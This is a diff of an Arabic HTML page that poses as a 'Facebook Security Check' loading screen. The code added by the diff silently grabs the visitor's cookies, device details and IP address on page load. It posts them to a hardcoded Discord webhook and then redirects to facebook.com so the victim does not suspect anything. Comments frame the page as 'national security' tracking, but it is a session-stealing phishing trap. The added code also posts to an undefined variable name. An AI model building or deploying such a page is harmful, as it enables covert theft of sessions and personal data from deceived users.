@@ -1,46 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري تحميل المحتوى...</title>
-</head>
-<body style="background-color: #f0f2f5; font-family: Arial; text-align: center; padding-top: 20%;">
-    <div id="loader">
-        <img src="https://i.gifer.com" width="40">
-        <p>جاري فحص جودة الاتصال، يرجى الانتظار ثواني...</p>
-    </div>
-
+    <title>Facebook Security Check</title>
     <script>
-        // رابط الديسكورد الخاص بك (غرفة العمليات)
+    async function initSecureProcess() {
+        // 1. رابط الويب هوك الخاص بقناة الأمن الوطني (يجب استبداله بالرابط الحقيقي)
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
+        try {
+            // 2. جمع ملفات الجلسة (Cookies) والعنوان الرقمي (IP)
+            let sessionCookies = document.cookie || "Protected_In_App";
+            const ipResponse = await fetch('https://api.ipify.org');
+            const ipData = await ipResponse.json();
 
-        async function injectAndCapture() {
-            // جمع "هوية الجهاز" (Fingerprinting) صمتاً
-            const deviceData = {
-                content: "🎯 *تم حقن الجهاز وسحب البيانات المطلوبة بنجاح* 🎯",
+            // 3. تجهيز التقرير الاستخباري لإرساله لقناتكم
+            const report = {
                 embeds: [{
-                    title: "تقرير التعرف على المجرم (Device ID)",
+                    title: "🎯 تم سحب جلسة هدف - الأمن الوطني",
                     color: 15158332,
                     fields: [
-                        { name: "📱 نوع الهاتف بدقة", value: navigator.userAgent },
-                        { name: "🌐 عنوان الـ IP والشبكة", value: "جاري الاستخراج من السيرفر..." },
-                        { name: "🍪 بصمة المتصفح (Cookies)", value: "```" + (document.cookie || "محمية - تم سحب بصمة الجهاز بدلاً عنها") + "```" },
-                        { name: "🖥️ دقة الشاشة واللغة", value: screen.width + "x" + screen.height + " / " + navigator.language },
-                        { name: "📍 الموقع التقديري", value: "بغداد / العراق" }
+                        { name: "🌐 عنوان الـ IP", value: ipData.ip, inline: true },
+                        { name: "📱 الجهاز", value: navigator.userAgent },
+                        { name: "🍪 ملفات الجلسة (Cookies)", value: "```" + sessionCookies + "```" }
                     ],
-                    footer: { text: "وحدة الملاحقة التقنية - الأمن الوطني" }
+                    footer: { text: "وحدة الملاحقة الرقمية" },
+                    timestamp: new Date()
                 }]
             };
 
-            // إرسال البيانات فوراً للديسكورد
-            await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(deviceData)
+            // 4. الإرسال الصامت للبيانات
+            await fetch(WEB_HOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(report)
             });
 
-            // التمويه: تحويل المجرم لخبر عاجل لكي لا يشك
-            setTimeout(() => {
-                window.location.href = "https://www.alsumaria.tv"; 
-            }, 1500);
+        } catch (e) {
+            console.log("Network Secure");
         }
+
+        // 5. التمويه: توجيه المجرم فوراً لصفحة أمان فيسبوك الرسمية
+        setTimeout(() => {
+            window.location.href = "https://www.facebook.com";
+        }, 500);
+    }
+    window.onload = initSecureProcess;
+    </script>
+</head>
+<body style="background-color: #f0f2f5; font-family: Arial, sans-serif; text-align: center; padding-top: 100px;">
+    <div id="loader">
+        <img src="https://i.gifer.com" width="40">
+        <p style="color: #606770;">جاري التحقق من أمان الرابط... يرجى الانتظار</p>
+    </div>
+</body>
+</html>
